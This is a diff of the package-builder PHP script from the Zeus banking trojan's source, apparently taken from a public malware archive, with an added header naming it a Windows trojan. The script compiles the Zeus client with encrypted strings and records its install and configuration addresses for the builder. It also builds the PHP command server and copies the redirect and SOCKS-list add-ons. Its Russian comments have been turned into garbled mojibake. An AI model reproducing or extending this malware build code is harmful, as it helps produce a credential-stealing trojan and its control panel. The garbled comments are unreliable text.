@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 <?php error_reporting(E_ALL); set_time_limit(0);
 
 require_once('tools.inc.php');
@@ -7,7 +18,7 @@ require_once('baseconfig.inc.php');
 require_once('installdata.inc.php');
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-// Вывод логотипа и обработка командной строки.
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 ///////////////////////////////////////////////////////////////////////////////////////////////////
 {
   writeLn(str_repeat('=', 80)."\r\n".BO_NAME." package builder.\r\n".str_repeat('=', 80)."\r\n");
@@ -25,7 +36,7 @@ require_once('installdata.inc.php');
 }
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-// Вывод заголовка сборки.
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 ///////////////////////////////////////////////////////////////////////////////////////////////////
 define('BO_SIGNATURE', $_SERVER['argv'][3]);
 writeLn("-> Configuration:  ".basename($configDir)."\n".
@@ -35,7 +46,7 @@ writeLn("-> Configuration:  ".basename($configDir)."\n".
 if(getenv('BO_SLIENT') === FALSE)waitAnyKey();
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-// Начало сборки.
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 ///////////////////////////////////////////////////////////////////////////////////////////////////
 require_once($dir['source']['common'].'\defines.php');
 
@@ -67,10 +78,10 @@ if(configBool('client_platforms'))
 
   generateCryptedStrings($dir['source']['client'].'\cryptedstrings');
   
-  //Сборка.
+  //пїЅпїЅпїЅпїЅпїЅпїЅ.
   buildBinary('client', 0, true, true);
   
-  //Создание данных для билдера.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   $client32 = '';
   $client32 .= "#define CLIENT32_VA_BASECONFIG ".sprintf('0x%08X', getVaFromMap('client', 'win32', 'baseConfigSource'))."\r\n";
   $client32 .= "#define CLIENT32_VA_INSTALL    ".sprintf('0x%08X', getVaFromMap('client', 'win32', '_install'))."\r\n"; //CoreInstall.
@@ -87,7 +98,7 @@ if(configBool('builder_platforms'))
   writeStep("BUILDING SAMPLE CONFIGURATION FILE");
   buildConfigSample($dir['output']['builder']);
 
-  //Копируем лицензию, если она сущеcтвует.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅcпїЅпїЅпїЅпїЅпїЅ.
   copyFileIfExists("{$configDir}\\license.key", $dir['output']['builder'].'\license.key');
 }
 
@@ -109,11 +120,11 @@ if(platformEnabled('server', 'php'))
   
   buildBinary('server', 0, false, false);
   
-  //Копируем гео-базу.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ-пїЅпїЅпїЅпїЅ.
   copyFile($dir['geobase'].'\country[maxmind].txt', $dir['output']['server'].'[php]\install\geobase.txt');
   createSubDir($dir['source']['server'].'[php]\tmp');
   
-  //Копируем дополнения.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   createSubDir($dir['output']['other']);
   copyFile($dir['source']['other'].'\redir.php', $dir['output']['other'].'\redir.php');
   copyFile($dir['source']['other'].'\sockslist.php', $dir['output']['other'].'\sockslist.php');
